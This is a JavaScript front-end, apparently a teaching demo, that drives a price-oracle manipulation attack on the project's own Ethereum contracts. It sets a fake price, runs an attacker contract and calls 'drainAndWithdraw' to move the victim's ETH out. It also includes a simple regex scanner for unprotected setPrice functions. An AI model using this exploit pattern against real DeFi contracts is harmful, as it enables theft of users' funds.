// ====== CONFIG: FILL THESE AFTER DEPLOYING CONTRACTS ======

const VULNERABLE_ORACLE_ADDRESS = "0x421644DC139096d9FBe89949926F1564b93C7C7F";

const VICTIM_CONTRACT_ADDRESS = "0xa6551042e0F3e9455ae7BBCE7Bb2708F5720ed69";

const ATTACKER_CONTRACT_ADDRESS = "0x304E58107bb744196cF2cF3E71037bfcFdc1B32C";

// ====== ABIs ======
const vulnerableOracleAbi = [
  "function setPrice(uint256 _price) public",
  "function getPrice() public view returns (uint256)",
];

const victimAbi = [
  "function buyTokens() public payable",
  "function sellTokens(uint256 tokenAmount) public", // Needed for drain
  "function balances(address owner) public view returns (uint256)",
];

const attackerAbi = [
  "function attack(uint256 fakePrice) public payable",
  "function drainAndWithdraw() public", // The Cash Out function
  "function manipulatePrice(uint256 newPrice) public",
];

// ====== GLOBAL STATE ======
let provider = null;
let signer = null;
let currentAccount = null;

// ====== HELPERS ======
async function connectWallet() {
  if (!window.ethereum) {
    alert("MetaMask not detected.");
    return;
  }
  provider = new ethers.BrowserProvider(window.ethereum);
  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    currentAccount = accounts[0];
    signer = await provider.getSigner();

    document.getElementById("connectBtn").textContent =
        currentAccount.slice(0, 6) + "..." + currentAccount.slice(-4);

    await refreshAllViews();
  } catch (err) {
    console.error("Connection error:", err);
  }
}

function getContract(address, abi, readOnly = false) {
  if (!provider) provider = new ethers.BrowserProvider(window.ethereum);
  const runner = readOnly ? provider : signer;
  return new ethers.Contract(address, abi, runner);
}

// ====== UI ACTIONS ======
async function loadOraclePrice() {
  try {
    const c = getContract(VULNERABLE_ORACLE_ADDRESS, vulnerableOracleAbi, true);
    const price = await c.getPrice();
    document.getElementById("oraclePrice").textContent = price.toString();
  } catch (err) { console.error(err); }
}

async function loadTokenBalance() {
  if (!currentAccount) return;
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi, true);
    const bal = await c.balances(currentAccount);
    document.getElementById("tokenBalance").textContent = bal.toString();
  } catch (err) { console.error(err); }
}

async function loadAttackerBalance() {
  try {
    // We check the balance of the ATTACKER CONTRACT inside the VICTIM system
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi, true);
    const bal = await c.balances(ATTACKER_CONTRACT_ADDRESS);
    document.getElementById("attackerBalance").textContent = bal.toString();
  } catch (err) { console.error(err); }
}

async function updateOraclePrice() {
  if (!signer) return alert("Connect Wallet");
  const price = document.getElementById("fakePriceInput").value;
  try {
    const c = getContract(VULNERABLE_ORACLE_ADDRESS, vulnerableOracleAbi);
    const tx = await c.setPrice(price);
    await tx.wait();
    await loadOraclePrice();
  } catch (err) { alert("Failed. See console."); console.error(err); }
}

async function buyTokens() {
  if (!signer) return alert("Connect Wallet");
  const amount = document.getElementById("ethAmountInput").value;
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi);
    const tx = await c.buyTokens({ value: ethers.parseEther(amount) });
    await tx.wait();
    await loadTokenBalance();
  } catch (err) { alert("Failed. See console."); console.error(err); }
}

async function runAttack() {
  if (!signer) return alert("Connect Wallet");
  const price = document.getElementById("attackPriceInput").value;
  const ethAmt = document.getElementById("attackEthInput").value;
  try {
    const c = getContract(ATTACKER_CONTRACT_ADDRESS, attackerAbi);
    const tx = await c.attack(price, { value: ethers.parseEther(ethAmt) });
    await tx.wait();
    await refreshAllViews();
    alert("Attack Executed! Check Attacker Loot.");
  } catch (err) { alert("Attack Failed. See console."); console.error(err); }
}

async function cashOut() {
    if (!signer) return alert("Connect Wallet");
    try {
        const c = getContract(ATTACKER_CONTRACT_ADDRESS, attackerAbi);
        // This calls the function that sells tokens and sends ETH to you
        const tx = await c.drainAndWithdraw();
        await tx.wait();
        await refreshAllViews();
        alert("Funds Drained! Check your Wallet Balance.");
    } catch(err) {
        alert("Cash Out Failed. Did you implement drainAndWithdraw in solidity?");
        console.error(err);
    }
}

// ====== SCANNER LOGIC ======
function handleFileUpload(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = function(e) {
        // Dump file content into textarea
        document.getElementById("codeInput").value = e.target.result;
    };
    reader.readAsText(file);
}

function analyzeCode() {
  const code = document.getElementById("codeInput").value;
  const resultBox = document.getElementById("scanResult");
  const msgBox = document.getElementById("scanMessage");

  resultBox.style.display = "block";
  let findings = [];

  // Regex Patterns for Vulnerabilities
  const setPriceRegex = /function\s+setPrice\s*\([^)]*\)\s*public/;
  const authRegex = /onlyOwner|require\(\s*msg\.sender/;

  if (setPriceRegex.test(code) && !authRegex.test(code)) {
    findings.push("CRITICAL: 'setPrice' is public without 'onlyOwner'. Oracle is easily manipulated.");
  }
  if (code.includes(".getPrice()") && !code.includes("AggregatorV3Interface")) {
    findings.push("HIGH: Uses insecure/custom oracle instead of Chainlink.");
  }
  if (code.includes("* price")) {
    findings.push("INFO: Price used directly in multiplication. Check for overflow/decimals.");
  }

  if (findings.length > 0) {
    msgBox.innerHTML = findings.join("<br><br>");
    resultBox.style.borderColor = "#ef4444";
    msgBox.style.color = "#fca5a5";
  } else {
    msgBox.textContent = "No obvious oracle vulnerabilities found.";
    resultBox.style.borderColor = "#22c55e";
    msgBox.style.color = "#4ade80";
  }
}

async function refreshAllViews() {
  await loadOraclePrice();
  await loadTokenBalance();
  await loadAttackerBalance();
}

// ====== INIT ======
window.addEventListener("DOMContentLoaded", () => {
  document.getElementById("connectBtn").addEventListener("click", connectWallet);
  document.getElementById("setPriceBtn").addEventListener("click", updateOraclePrice);
  document.getElementById("buyTokensBtn").addEventListener("click", buyTokens);
  document.getElementById("runAttackBtn").addEventListener("click", runAttack);
  document.getElementById("cashOutBtn").addEventListener("click", cashOut);

  // Scanner Listeners
  document.getElementById("scanBtn").addEventListener("click", analyzeCode);
  document.getElementById("fileUpload").addEventListener("change", handleFileUpload);
});